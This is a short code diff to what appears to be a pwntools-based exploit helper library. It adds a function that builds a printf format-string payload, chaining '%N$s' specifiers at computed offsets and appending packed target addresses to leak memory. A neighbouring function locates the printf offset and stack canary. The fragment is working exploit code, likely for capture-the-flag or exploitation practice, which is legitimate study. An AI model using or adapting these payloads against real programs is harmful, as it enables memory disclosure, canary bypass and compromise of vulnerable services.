@@ -69,5 +69,9 @@ def find_printf_offset_canary(resp) -> int:
 
 
 # New: helpers for leaking
-#def leak_printf_deref(buffer_offset: int, addr: list):
-#    payload = ','.join("%{}$s".format(i) for i in range(buffer_offset, buffer_offset+len(addr)))
+def leak_printf_deref_payload(buffer_offset: int, addr: list):
+    extra = (len(addr)*(3+len(str(buffer_offset))+1)//(context.bits//8)) + 1
+    payload = ','.join("%{}$s".format(i) for i in range(buffer_offset+extra, buffer_offset+extra+len(addr))).ljust(extra*context.bits//8).encode()
+    payload += b''.join(map(pack[context.arch], addr))
+    return payload
+
